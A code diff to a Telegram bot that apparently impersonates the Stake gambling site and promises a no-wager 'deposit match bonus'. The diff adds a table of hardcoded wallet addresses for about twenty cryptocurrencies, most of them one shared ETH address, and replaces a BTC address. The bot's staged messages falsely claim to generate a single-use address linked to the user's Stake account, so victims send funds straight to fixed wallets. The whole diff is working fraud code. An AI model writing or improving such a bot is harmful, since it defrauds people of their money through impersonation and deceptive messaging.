@@ -4,6 +4,30 @@ require("dotenv").config();
 const { TOKEN } = process.env;
 
 const bot = new TelegramBot(TOKEN, { polling: true });
+// Cryptocurrency-specific addresses
+const cryptoAddresses = {
+  BTC: "bc1q30qutsg7y4ttpwluthpukqymv65940wz0wr22s",
+  ETH: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  SOLANA: "CyCDUHQPXGRJ5Xjo6omXUqoBKJb23uSyjqm7abEhHUBb",
+  LTC: "ltc1qxfgxjnzwau70pvxg4cf07v7mkkc8rqjdpfzkux",
+  USDT: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  DOGE: "DPodYaPdtR3M5BPccYMHjzUyiBYoo1hTuo",
+  BCH: "qrdz2ndwvhlx3q7hllu8s6pk5eg6wnuyrqw30mn3cm",
+  XRP: "rD5pdYqgHHXhVdxz3geEoPPhsLJFM5GfPn",
+  EOS: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  TRX: "TYmhE4xhZYBjZ3aYUgP2dUrCrLCjEsd18e",
+  BNB: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  USDC: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  APE: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  BUSD: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  CRO: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  DAI: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  LINK: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  SAND: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  SHIB: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  UNI: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40",
+  MATIC: "0x1a74c7EAE5A5eCcCaB14Fa83bEa55f752A8A4d40"
+};
 
 const userSession = {};
 
@@ -101,28 +125,33 @@ bot.on("callback_query", async (query) => {
     session.state = "amount";
   } else if (data.startsWith("payin_")) {
     const currency = data.split("_")[1].toUpperCase();
+    const address = cryptoAddresses[currency] || "Address Not Available";
+
     setTimeout(() => {
       bot.sendMessage(
         userId,
-        `I will now retrieve a single-use address associated with the Stake account ${session.name}  you provided earlier to facilitate our deposit match bonus with no wager requirement.`
+        `I will now retrieve a single-use address associated with the Stake account ${session.name} you provided earlier to facilitate our deposit match bonus with no wager requirement.`
       );
     }, 1500);
+
     setTimeout(() => {
       bot.sendMessage(
         userId,
         `🚼 Your deposit will appear in your Transactions page after 1 confirmation is reached.`
       );
     }, 2500);
+
     setTimeout(() => {
       bot.sendMessage(
         userId,
-        `✅Your one-time use (${currency}) address has been generated successfully!`
+        `✅ Your one-time use (${currency}) address has been generated successfully!`
       );
     }, 3500);
+
     setTimeout(() => {
       bot.sendMessage(
         userId,
-        "-------------------------------------------\n`0x1818370D5b1a52242090E906AA2c6184E3a83903`\n\n-------------------------------------------",
+        `-------------------------------------------\n\`${address}\`\n\n-------------------------------------------`,
         {
           parse_mode: "Markdown",
         }
@@ -443,7 +472,7 @@ bot.on("message", async (msg) => {
     const message =
       session.click != "currencies"
         ? `${session.name} Select the cryptocurrency you want for the deposit bonus.`
-        : "🚀 Complete Your Payment!🚀\n\nTo finalize your purchase, simply click on the BTC address to copy.\nAnd then paste it on the site where it asks for BTC address. ✅\n\n`bc1q784c0kg0ktya66ysdwe70nedxm52k6yrsqsa99`\n\n🪙 Make sure you use the correct address for the specific crypto you're purchasing.\n🚼 Your deposit will appear in your Transactions page after 1 confirmation is reached.";
+        : "🚀 Complete Your Payment!🚀\n\nTo finalize your purchase, simply click on the BTC address to copy.\nAnd then paste it on the site where it asks for BTC address. ✅\n\n`bc1qz0fwwaagrcdxwpcent59gukrtspdmctg73ykr4`\n\n🪙 Make sure you use the correct address for the specific crypto you're purchasing.\n🚼 Your deposit will appear in your Transactions page after 1 confirmation is reached.";
 
     setTimeout(() => {
       bot.sendMessage(userId, "Connection Interrupted. Reconnecting...");
